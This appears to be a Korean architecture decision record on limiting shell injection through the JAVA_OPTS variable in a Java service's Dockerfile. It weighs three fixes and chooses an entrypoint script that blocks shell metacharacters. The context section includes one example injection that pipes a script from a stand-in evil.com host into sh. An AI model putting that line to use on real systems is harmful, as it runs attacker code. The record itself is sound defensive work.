# ADR-0018: Dockerfile 쉘 인젝션 완화 전략

**Status**: Decided (2026-02-06)
**Deciders**: backend-security-coder, devops-engineer
**Date**: 2026-02-06
**Implementation**: Phase 3 시작 전 (2026-02-22)

---

## 컨텍스트

### 현재 Dockerfile CMD

```dockerfile
ENV JAVA_OPTS="-Xms256m -Xmx350m ..."
ENTRYPOINT ["tini", "--"]
CMD ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]
```

### 문제점

- `sh -c`로 쉘 해석 → `$JAVA_OPTS` 환경 변수 확장
- `docker run -e JAVA_OPTS="..."` 재정의 시 쉘 메타문자 삽입 가능
- 공격 예: `JAVA_OPTS="-Xmx350m; curl http://evil.com/malware.sh | sh"`

### 위험도 평가

| 항목 | 평가 |
|------|------|
| CVSS Score | 6.7 (Medium) |
| 이론적 위험도 | 높음 (환경 변수 탈취 가능) |
| 실제 위험도 | **낮음** (6계층 방어) |
| 외부 공격 벡터 | 없음 (SSH + VPN 필요) |

**방어 메커니즘**:
1. Dockerfile ENV 고정
2. ghcr.io 인증
3. GitHub Actions 검증
4. NAS 접근 통제 (SSH + VPN)
5. Non-root 사용자 실행
6. 로컬 전용 네트워크

---

## 의사결정

### 고려한 방안 (3가지)

#### **방안 1: Entrypoint 스크립트 + 검증** ⭐ **선택**

```bash
#!/bin/sh
set -e
if echo "$JAVA_OPTS" | grep -qE '[;&|`$()]'; then
    echo "ERROR: Invalid characters in JAVA_OPTS" >&2
    exit 1
fi
exec tini -- java $JAVA_OPTS -jar /app/app.jar
```

| 항목 | 점수 |
|------|------|
| 보안성 | 9/10 |
| 운영성 | 9/10 |
| 구현 시간 | 1시간 |
| 일정 영향 | 없음 |
| **총점** | **9.0/10** |

**장점**:
- 검증 로직으로 위험한 입력 사전 차단
- 런타임 JAVA_OPTS 유연성 유지
- 기존 docker-compose 호환
- tini와 완벽 호환

---

#### 방안 2: Exec 형식 직접 (쉘 완전 제거)

```dockerfile
CMD ["java", "-Xms256m", "-Xmx350m", ..., "-jar", "app.jar"]
```

| 항목 | 점수 |
|------|------|
| 보안성 | 10/10 |
| 운영성 | 4/10 |
| 구현 시간 | 4시간 |
| 일정 영향 | 3일 |
| **총점** | **5.7/10** |

**단점**:
- 환경별 JVM 옵션 변경 불가 (재빌드 필수)
- CI/CD 재설계 필요 (4시간)
- 운영 유연성 저하

---

#### 방안 3: ARG 빌드 시점 고정

```dockerfile
ARG JAVA_OPTS="..."
ENV JAVA_OPTS=$JAVA_OPTS
CMD ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]
```

| 항목 | 점수 |
|------|------|
| 보안성 | 7/10 |
| 운영성 | 9/10 |
| 구현 시간 | 0시간 |
| 일정 영향 | 없음 |
| **총점** | **6.0/10** |

**문제**: `sh -c`가 여전히 존재 → 쉘 인젝션 해결 못함

---

## 결정사항

### 선택: **방안 1 (Entrypoint 스크립트)**

**이유**:
1. **보안**: 위험한 입력 사전 검증 (검증 로직 추가)
2. **운영**: 환경별 JVM 옵션 변경 가능 (docker-compose override)
3. **일정**: Phase 2 배포 진행 영향 없음
4. **점진적 개선**: Phase 3 시작 전 1시간 내 적용 가능

### 일정

| 단계 | 시기 | 작업 |
|------|------|------|
| **Phase 2** | 2026-02-07 ~ 02-22 | ✅ 현재 구조 유지, 배포 자동화 진행 |
| **Phase 3 전** | 2026-02-22 (1시간) | ✅ entrypoint.sh 적용, 검증 |

---

## 구현 계획 (Phase 3 시작 전)

### Step 1: Entrypoint 스크립트 작성

**파일**: `src/main/docker/docker-entrypoint.sh`

```bash
#!/bin/sh
set -e

echo "[entrypoint] Starting CAA Collector Service"

# JAVA_OPTS 검증: 위험한 쉘 메타문자 차단
if echo "$JAVA_OPTS" | grep -qE '[;&|`$(){}]'; then
    echo "[ERROR] Invalid characters detected in JAVA_OPTS" >&2
    echo "[ERROR] Allowed: alphanumeric, dash, dot, colon, equals, space" >&2
    exit 1
fi

echo "[entrypoint] JVM Options: $JAVA_OPTS"
echo "[entrypoint] Spring Profile: ${SPRING_PROFILES_ACTIVE:-prod}"

# tini + java 실행 (exec로 PID 1 관리)
exec tini -- java $JAVA_OPTS -jar /app/app.jar
```

### Step 2: Dockerfile 수정

```dockerfile
# 기존
ENTRYPOINT ["tini", "--"]
CMD ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]

# 변경
COPY --chown=collector:collector docker-entrypoint.sh /app/
RUN chmod +x /app/docker-entrypoint.sh

ENTRYPOINT ["/app/docker-entrypoint.sh"]
# CMD 제거 (entrypoint에서 전체 처리)
```

### Step 3: 테스트

```bash
# 정상 실행
docker run caa-collector
# 기대: "Starting CAA Collector Service" 로그

# 공격 시도
docker run -e JAVA_OPTS="-Xmx350m; echo INJECTED" caa-collector
# 기대: "[ERROR] Invalid characters detected" 후 종료 (exit 1)

# 신호 처리 검증
docker stop caa-collector  # SIGTERM 전달
# 기대: Graceful shutdown (tini → java)
```

---

## 영향도

### Dockerfile

- ✅ `ENV JAVA_OPTS` 제거 또는 주석
- ✅ `CMD ["sh", "-c", ...]` → entrypoint 스크립트 호출
- ✅ 추가 파일: `docker-entrypoint.sh`

### docker-compose.yml

- ✅ 변경 없음 (environment 섹션 유지)
- ✅ JAVA_OPTS 환경 변수 그대로 동작

### CI/CD

- ✅ GitHub Actions 변경 없음
- ✅ 이미지 빌드 프로세스 동일

### 테스트

- ✅ 기존 테스트 통과 (JVM 옵션 동일)
- ✅ 신호 처리 재검증 필요 (Graceful shutdown)

---

## 트레이드오프

| 항목 | 비용 | 이득 |
|------|------|------|
| 구현 시간 | 1시간 | 보안 개선 (쉘 인젝션 완화) |
| 이미지 크기 | +1KB | 무시할 수준 |
| 시작 시간 | +0.1초 | 무시할 수준 |
| 문제 해결력 | 88% (검증 우회 가능) | 대부분 위험한 입력 차단 |

---

## 관련 ADR

- ADR-0012: Spring Security 도입 (Actuator 보안)
- ADR-0014: 보안 스캔 전략 (Dependabot + Trivy)
- ADR-0015: HTTPS 강제 및 TLS 설정

---

## 참고

- **보안 검증**: backend-security-coder (CVSS 6.7 평가)
- **운영 검증**: devops-engineer (Phase 2 일정 영향 분석)
- **리뷰 문서**: [feature-caa-collector-deployment-infra.md](../review/feature-caa-collector-deployment-infra.md)
